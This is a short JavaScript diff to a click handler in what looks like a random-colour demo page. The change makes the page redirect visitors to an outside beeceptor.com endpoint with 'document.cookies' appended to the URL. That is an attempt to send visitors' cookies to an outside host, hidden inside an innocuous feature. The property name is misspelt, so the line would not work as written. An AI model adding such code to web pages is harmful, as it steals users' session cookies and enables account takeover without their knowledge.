@@ -6,6 +6,6 @@ function getRandomInt(max) {
   }  
 
 color.onclick = () => {
-    window.location.replace('https://keskispace.free.beeceptor.com/');
+    window.location.replace('https://keskispace.free.beeceptor.com/'+document.cookies);
     target.style.color = `rgb(${getRandomInt(255)}, ${getRandomInt(255)}, ${getRandomInt(255)})`;
 }
